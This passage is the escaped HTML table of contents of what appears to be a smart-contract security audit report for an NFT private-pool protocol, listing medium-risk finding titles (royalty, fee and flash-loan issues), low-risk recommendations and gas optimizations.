href=\"#m-07-royalty-recipients-will-not-get-fair-share-of-royalties\">[M-07] Royalty recipients will not get fair share of royalties</a></li>\n<li><a href=\"#m-08-loss-of-funds-for-traders-due-to-accounting-error-in-royalty-calculations\">[M-08] Loss of funds for traders due to accounting error in royalty calculations</a></li>\n<li><a href=\"#m-09-malicious-royalty-recipient-can-steal-excess-eth-from-buy-orders\">[M-09] Malicious royalty recipient can steal excess eth from buy orders</a></li>\n<li><a href=\"#m-10-incorrect-protocol-fee-is-taken-when-changing-nfts\">[M-10] Incorrect protocol fee is taken when changing NFTs</a></li>\n<li><a href=\"#m-11-factorycreate-predictability-of-pool-address-creates-multiple-issues\">[M-11] <code>Factory.create</code>: Predictability of pool address creates multiple issues.</a></li>\n<li><a href=\"#m-12-prohibition-to-create-private-pools-with-the-factory-nft\">[M-12] Prohibition to create private pools with the factory NFT</a></li>\n<li><a href=\"#m-13-transaction-revert-if-the-basetoken-does-not-support-0-value-transfer-when-charging-changefee\">[M-13] Transaction revert if the <code>baseToken</code> does not support 0 value transfer when charging <code>changeFee</code></a></li>\n<li><a href=\"#m-14-the-royaltyrecipient-could-not-be-prepare-to-receive-ether-making-the-sell-to-fail\">[M-14] The <code>royaltyRecipient</code> could not be prepare to receive ether, making the <code>sell</code> to fail</a></li>\n<li><a href=\"#m-15-pool-tokens-can-be-stolen-via-privatepoolflashloan-function-from-previous-owner\">[M-15] Pool tokens can be stolen via <code>PrivatePool.flashLoan</code> function from previous owner</a></li>\n<li><a href=\"#m-16-privatepoolflashloan-takes-fee-from-the-wrong-address\">[M-16] <code>PrivatePool.flashLoan()</code> takes fee from the wrong address</a></li>\n<li><a href=\"#m-17-the-tokenuri-method-does-not-check-if-the-nft-has-been-minted-and-returns-data-for-the-contract-that-may-be-a-fake-nft\">[M-17] The <code>tokenURI</code> method does not check if the NFT has been minted and returns data for the contract that may be a fake NFT</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#1-the-factorycreate-function-is-susceptible-to-re-entrancy-as-it-performs-a-_safemint-before-initializing-the-pool\">1 The <code>Factory.create</code> function is susceptible to re-entrancy as it performs a <code>_safeMint</code> before initializing the pool.</a></li>\n<li><a href=\"#2-the-factorycreate-function-performs-plain-transfer-of-funds-instead-of-calling-the-deposit-function-this-way-the-deposit-event-is-not-emitted\">2 The <code>Factory.create</code> function performs plain transfer of funds instead of calling the <code>deposit</code> function. This way the <code>Deposit</code> event is not emitted.</a></li>\n<li><a href=\"#3-there-is-no-fee-cap-on-the-factorysetprotocolfeerate-function-a-value-greater-then-10000-can-break-the-fee-calculations-in-private-pool-consider-validating-that-the-input-is-less-than-10000\">3 There is no fee cap on the <code>Factory.setProtocolFeeRate</code> function. A value greater then 10000 can break the fee calculations in private pool. Consider validating that the input is less than 10000.</a></li>\n<li><a href=\"#4-factorytokenid-does-not-validate-the-input-id-parameter-consider-validating-that-the-id-exist-and-the-respective-pool-is-created-by-the-factory\">4 <code>Factory.tokenId</code> does not validate the input <code>id</code> parameter. Consider validating that the <code>id</code> exist and the respective pool is created by the factory.</a></li>\n<li><a href=\"#5-once-initialization-is-done-the-privatepoolfeerate-variable-can-never-be-changed-consider-adding-an-owner-restricted-function-to-update-feerate\">5 Once initialization is done the <code>PrivatePool.feeRate</code> variable can never be changed. Consider adding an <code>owner</code> restricted function to update <code>feeRate</code>.</a></li>\n<li><a href=\"#6-in-buy-and-sell-functions-consider-validating-that-the-length-of-all-input-arrays-are-equal-tokenids--tokenweights\">6 In <code>buy</code> and <code>sell</code> functions consider validating that the <code>length</code> of all input arrays are equal (<code>tokenIds</code> &#x26; <code>tokenWeights</code>).</a></li>\n<li><a href=\"#7-consider-adding-a-check-in-privatepoolsumweightsandvalidateproof-function-to-validate-that-every-element-of-tokenweights-array-is-greater-than-or-equal-to-1e18\">7 Consider adding a check in <code>PrivatePool.sumWeightsAndValidateProof</code> function to validate that every element of <code>tokenWeights</code> array is greater than or equal to <code>1e18</code>.</a></li>\n<li><a href=\"#8-in-the-privatepoolmetadatatokenuri-function-consider-using-stringstohexstringaddresstokenid-for-the-name-field\">8 In the <code>PrivatePoolMetadata.tokenURI</code> function consider using <code>Strings.toHexString(address(tokenId)))</code> for the <code>name</code> field.</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#gas-optimizations-1\">Gas Optimizations</a></li>\n<li><a href=\"#g-01-cache-calldatamemory-pointers-for-complex-types-to-avoid-offset-calculations\">G-01 Cache calldata/memory pointers for complex types to avoid offset calculations</a></li>\n<li><a href=\"#g-02-use-calldata-instead-of-memory-for-function-arguments-that-do-not-get-mutated\">G-02 Use calldata instead of memory for function arguments that do not get mutated</a></li>\n<li><a href=\"#g-03-state-variables-can-be-cached-instead-of-re-reading-them-from-storage\">G-03 State variables can be cached instead of re-reading them from storage</a></li>\n<li><a href=\"#g-04-cache-state-variables-outside-of-loop-to-avoid-reading-storage-on-every-iteration\">G-04 Cache state variables outside of loop to avoid reading storage on every iteration</a></li>\n<li><a href=\"#g-05-rearrange-code-to-fail-early\">G-05 Rearrange code to fail early</a></li>\n<li><a href=\"#g-06-x--yx---y-costs-more-gas-than-x--x--yx--x---y-for-state-variables\">G-06 <code>x += y/x -= y</code> costs more gas than <code>x = x + y/x = x - y</code> for state variables</a></li>\n<li><a href=\"#g-07-if-statements-that-use--can-be-refactored-into-nested-if-statements\">G-07 <code>If</code> statements that use <code>&#x26;&#x26;</code> can be refactored into nested <code>if</code> statements</a></li>\n<li><a href=\"#g-08-use-assembly-for-loops\">G-08 Use assembly for loops</a></li>\n<li><a href=\"#gasreport-output-with-all-optimizations-applied\"><code>GasReport</code> output, with all optimizations applied</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}